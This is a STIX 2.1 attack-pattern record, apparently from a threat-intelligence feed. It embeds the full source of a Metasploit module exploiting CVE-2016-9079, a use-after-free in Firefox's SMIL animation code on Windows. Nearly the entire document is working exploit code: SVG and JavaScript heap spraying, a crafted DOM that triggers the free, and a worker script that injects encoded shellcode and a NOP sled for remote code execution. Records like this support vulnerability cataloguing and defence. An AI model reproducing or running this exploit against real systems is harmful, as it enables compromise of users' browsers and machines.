{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d47573e4-f2f7-409d-a333-ad05555d45d4",
    "created": "2024-08-14T16:41:59.23043Z",
    "modified": "2024-08-14T16:41:59.230434Z",
    "name": "\"Firefox nsSMILTimeContainer::NotifyTimeChange() RCE\"",
    "description": " This module exploits an out-of-bounds indexing/use-after-free condition present in nsSMILTimeContainer::NotifyTimeChange() across numerous versions of Mozilla Firefox on Microsoft Windows.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/firefox_smil_uaf.rb",
            "external_id": "firefox_smil_uaf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-9079"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1321066"
        },
        {
            "source_name": "reference",
            "url": "https://www.mozilla.org/en-US/security/advisories/mfsa2016-92/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n    Rank = NormalRanking\n\n    include Msf::Exploit::Remote::BrowserExploitServer\n\n    def initialize(info={})\n      super(update_info(info,\n        'Name'           => \"Firefox nsSMILTimeContainer::NotifyTimeChange() RCE\",\n        'Description'    => %q{\n          This module exploits an out-of-bounds indexing/use-after-free condition present in\n          nsSMILTimeContainer::NotifyTimeChange() across numerous versions of Mozilla Firefox\n          on Microsoft Windows.\n          },\n          'License'        => MSF_LICENSE,\n          'Author'         =>\n          [\n            'Anonymous Gaijin',                                 # Original research/exploit\n            'William Webb <william_webb[at]rapid7.com>'         # Metasploit module\n          ],\n          'Platform'       => 'win',\n          'BrowserRequirements' =>\n            {\n              source:  /script/i,\n              os_name: OperatingSystems::Match::WINDOWS,\n              ua_name: HttpClients::FF,\n              # Fixed in Firefox 50.0.2\n              ua_ver: lambda { |ver| ver.to_i.between?(38, 41) }\n            },\n          'Targets'        =>\n          [\n            [ 'Mozilla Firefox 38 to 41',\n              {\n                'Platform' => 'win',\n                'Arch'     => ARCH_X86,\n              }\n            ],\n          ],\n          'DefaultOptions'  =>\n          {\n            'EXITFUNC' => \"thread\",\n            'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n          },\n          'References'     =>\n            [\n              [ 'CVE', '2016-9079' ],\n              [ 'URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=1321066' ],\n              [ 'URL', 'https://www.mozilla.org/en-US/security/advisories/mfsa2016-92/' ]\n            ],\n          'DisclosureDate' => '2016-11-30',\n          'DefaultTarget'  => 0\n        )\n      )\n    register_options(\n      [\n        OptBool.new('UsePostHTML', [ true, 'Rewrite page with arbitrary HTML after successful exploitation.  NOTE: if set to true, you should probably rewrite data/exploits/ff_smil_uaf/post.html to something useful!', false ]),\n      ], self.class\n    )\n  end\n\n  def exploit_html(cli)\n    p = payload.encoded\n    arch = Rex::Arch.endian(target.arch)\n    payload_final = Rex::Text.to_unescape(p, arch, prefix='\\\\u')\n    base_uri = get_module_resource\n\n    # stuff that gets adjusted alot during testing\n\n    defrag_x = %Q~\n       for (var i = 0; i < 0x4000; i++)\n         heap80[i] = block80.slice(0)\n     ~\n     defrag_y = %Q~\n       for (var i = 0x4401; i < heap80.length; i++)\n         heap80[i] = block80.slice(0)\n     ~\n\n    js = %Q~\n    var worker = new Worker('#{base_uri}/worker.js');\n    var svgns = 'http://www.w3.org/2000/svg';\n    var heap80 = new Array(0x5000);\n    var heap100 = new Array(0x5000);\n    var block80 = new ArrayBuffer(0x80);\n    var block100 = new ArrayBuffer(0x100);\n    var sprayBase = undefined;\n    var arrBase = undefined;\n\n    var animateX = undefined;\n    var containerA = undefined;\n\n    var milestone_offset = 0x90;\n\n    var $ = function(id) { return document.getElementById(id); }\n\n    var heap = function()\n    {\n     var u32 = new Uint32Array(block80)\n\n     u32[4] = arrBase - milestone_offset;\n\n     u32[0xa] = arrBase + 0x1000 - milestone_offset;\n\n     u32[0x10] = arrBase + 0x2000 - milestone_offset;\n\n     var x = document.createElementNS(svgns, 'animate')\n     var svg = document.createElementNS(svgns, 'svg')\n\n     svg.appendChild(x)\n     svg.appendChild(x.cloneNode(true))\n\n     for (var i = 0; i < 0x400; i++)\n       {\n         var node = svg.cloneNode(true);\n         node.setAttribute('id', 'svg' + i)\n         document.body.appendChild(node);\n       }\n       #{defrag_x}\n\n       for (var i = 0; i < 0x400; i++)\n         {\n           heap80[i + 0x3000] = block80.slice(0)\n           $('svg' + i).appendChild(x.cloneNode(true))\n         }\n\n         for (var i = 0; i < 0x400; i++)\n           {\n             $('svg' + i).appendChild(x.cloneNode(true))\n             $('svg' + i).appendChild(x.cloneNode(true))\n           }\n\n           for (var i = 0; i < heap100.length; i++)\n             heap100[i] = block100.slice(0)\n\n             #{defrag_y}\n\n             for (var i = 0x100; i < 0x400; i++)\n               $('svg' + i).appendChild(x.cloneNode(true))\n             }\n\n             var exploit = function()\n             {\n               heap();\n\n               animateX.setAttribute('begin', '59s')\n               animateX.setAttribute('begin', '58s')\n               animateX.setAttribute('begin', '10s')\n               animateX.setAttribute('begin', '9s')\n\n               // money shot\n\n               containerA.pauseAnimations();\n             }\n\n             worker.onmessage = function(e)\n             {\n              worker.onmessage = function(e)\n              {\n               window.setTimeout(function()\n               {\n                 worker.terminate();\n                 document.body.innerHTML = '';\n                 document.getElementsByTagName('head')[0].innerHTML = '';\n                 document.body.setAttribute('onload', '')\n                 document.write('<blink>')\n                 }, 1000);\n  }\n\n  arrBase = e.data;\n  exploit();\n  }\n\n\n  var idGenerator = function()\n  {\n   return 'id' + (((1+Math.random())*0x10000)|0).toString(16).substring(1);\n  }\n\n\n  var craftDOM = function()\n  {\n   containerA = document.createElementNS(svgns, 'svg')\n   var containerB = document.createElementNS(svgns, 'svg');\n\n   animateX = document.createElementNS(svgns, 'animate')\n   var animateA = document.createElementNS(svgns, 'animate')\n   var animateB = document.createElementNS(svgns, 'animate')\n\n   var animateC = document.createElementNS(svgns, 'animate')\n\n   var idX = idGenerator();\n   var idA = idGenerator();\n   var idB = idGenerator();\n   var idC = idGenerator();\n\n   animateX.setAttribute('id', idX);\n   animateA.setAttribute('id', idA);\n   animateA.setAttribute('end', '50s');\n   animateB.setAttribute('id', idB);\n   animateB.setAttribute('begin', '60s');\n   animateB.setAttribute('end', idC + '.end');\n   animateC.setAttribute('id', idC);\n   animateC.setAttribute('begin', '10s');\n   animateC.setAttribute('end', idA + '.end');\n\n   containerA.appendChild(animateX)\n   containerA.appendChild(animateA)\n   containerA.appendChild(animateB)\n\n   containerB.appendChild(animateC)\n\n   document.body.appendChild(containerA);\n   document.body.appendChild(containerB);\n  }\n  window.onload = craftDOM;\n    ~\n\n    # If you want to change the appearance of the landing page, do it here\n\n    html = %Q~\n    <html>\n    <head>\n    <meta charset=\"utf-8\"/>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    </body>\n    </html>\n    ~\n\n    if datastore['UsePostHTML']\n      f = File.open(File.join(Msf::Config.data_directory, \"exploits\", \"firefox_smil_uaf\", \"post.html\"), \"rb\")\n      c = f.read\n      html = html.gsub(\"<blink>\", c)\n    else\n      html = html.gsub(\"<blink>\", \"\")\n    end\n    send_response(cli, html, { 'Content-Type' => 'text/html', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache', 'Connection' => 'close' })\n  end\n\n  def worker_js(cli)\n    p = payload.encoded\n    arch = Rex::Arch.endian(target.arch)\n    payload = Rex::Text.to_unescape(p, arch)\n    wt = File.open(File.join(Msf::Config.data_directory, \"exploits\", \"firefox_smil_uaf\", \"worker.js\"), \"rb\")\n    c = wt.read\n    c = c.gsub(\"INSERTSHELLCODEHEREPLZ\", payload)\n    c = c.gsub(\"NOPSGOHERE\", \"\\u9090\")\n    send_response(cli, c, { 'Content-Type' => 'application/javascript', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache', 'Connection' => 'close' })\n  end\n\n  def on_request_exploit(cli, request, browser_info)\n    print_status(\"Got request: #{request.uri}\")\n    print_status(\"From: #{request.headers['User-Agent']}\")\n\n    if request.uri =~ /worker\\.js/\n      print_status(\"Sending worker thread Javascript ...\")\n      worker_js(cli)\n      return\n    end\n\n    if request.uri =~ /index\\.html/ or request.uri =~ /\\//\n\n      print_status(\"Sending exploit HTML ...\")\n      exploit_html(cli)\n      close_client(cli)\n      return\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-11-30",
    "x_mitre_platforms": [
        "win'"
    ]
}